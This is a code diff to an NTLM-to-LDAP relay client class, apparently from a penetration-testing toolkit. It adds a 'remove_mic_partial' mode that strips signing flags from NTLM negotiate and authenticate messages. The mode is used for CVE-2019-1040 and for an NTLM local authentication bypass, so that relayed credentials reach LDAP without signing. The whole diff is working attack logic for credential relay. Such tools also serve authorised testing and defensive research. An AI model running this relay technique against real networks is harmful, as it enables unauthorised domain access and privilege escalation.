@@ -69,7 +69,7 @@ class LDAPRelayClient(ProtocolClient):
         # When exploiting CVE-2019-1040, remove message signing flag
         # For SMB->LDAP this is required otherwise it triggers LDAP signing
         # Changing flags breaks the signature unless the client uses a non-standard implementation of NTLM
-        if self.serverConfig.remove_mic:
+        if self.serverConfig.remove_mic or self.serverConfig.remove_mic_partial:
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
@@ -131,6 +131,15 @@ class LDAPRelayClient(ProtocolClient):
             authMessage['MICLen'] = 0
             authMessage['Version'] = b''
             authMessage['VersionLen'] = 0
+            token = authMessage.getData()
+        # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
+        elif self.serverConfig.remove_mic_partial:
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            # Do NOT remove KEY_EXCH or VERSION flags
+            # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
             token = authMessage.getData()
 
         with self.session.connection_lock:
